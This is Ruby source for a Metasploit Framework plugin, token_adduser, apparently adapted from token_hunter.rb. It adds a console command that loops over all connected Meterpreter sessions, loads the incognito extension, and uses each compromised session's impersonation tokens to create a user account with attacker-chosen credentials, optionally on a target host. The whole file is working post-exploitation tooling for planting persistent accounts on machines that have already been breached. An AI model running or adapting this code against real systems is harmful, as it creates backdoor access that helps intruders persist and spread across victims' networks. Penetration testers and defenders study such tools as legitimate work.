#
# $Id$
#
# This is a modified version of token_hunter.rb. Credit to
# jduck (I believe) for much of the base code here.
#
# The goal of this script is to attempt to add a user via
# incognito using all connected meterpreter sessions.
#
# jseely[at]relaysecurity.com
#
# TODO: This should probably find new life as a post module.

module Msf

class Plugin::TokenAdduser < Msf::Plugin

  class TokenCommandDispatcher
    include Msf::Ui::Console::CommandDispatcher

    def name
      "Token Adduser"
    end

    def commands
      {
        'token_adduser'        => "Attempt to add an account using all connected meterpreter session tokens"
      }
    end

    def cmd_token_adduser(*args)

      opts = Rex::Parser::Arguments.new(
        "-h"   => [ true,   "Add account to host"],
      )

      # This is ugly.
      if (args.length == 0)
        print_line("Usage: token_adduser [options] <username> <password>")
        print_line(opts.usage)
        return
      end
    
      opt_user_pass  = []
      username = nil
      password = nil
      host = nil 
      opts.parse(args) do |opt, idx, val|
        case opt
        when "-h"
          host = val

        else
          # Excuse my weak ruby skills. I'm sure there's a better way to get username and password
          # from the args.
          opt_user_pass << val
        end
      end

      # Again, I'm sure there's a better way to do this.
      username = opt_user_pass[0]
      password = opt_user_pass[1]

      tokens_del = {}
      tokens_imp = {}

      framework.sessions.each_key do |sid|
        session = framework.sessions[sid]
        next unless session.type == "meterpreter"

        print_status(">> Opening session #{session.sid} / #{session.session_host}")

        unless session.incognito
          session.core.use("incognito")
        end

        unless session.incognito
          print_status("!! Failed to load incognito on #{session.sid} / #{session.session_host}")
          next
        end
        #print "DEBUG #{username} #{password}\n"
        res = session.incognito.incognito_add_user(host,username,password)
        if(res)
          print "#{res}\n"

          # Currently only stops on success if a user is trying to be added to a specific
          # host. I can't think of a good reason to stop on success (or even make it an option)
          # when trying to add a user to local sessions.
          if (host)
            if res =~ /\[\+\] Successfully|\[\-\] Password does not meet complexity requirements|\[\-\] User already exists/
              break
            end
          end
        end
      end
    end
  end


  def initialize(framework, opts)
    super
    add_console_dispatcher(TokenCommandDispatcher)
  end

  def cleanup
    remove_console_dispatcher('Token Adduser')
  end

  def name
    "token_adduser"
  end

  def desc
    "Attempt to add an account using all connected meterpreter session tokens"
  end
end
end
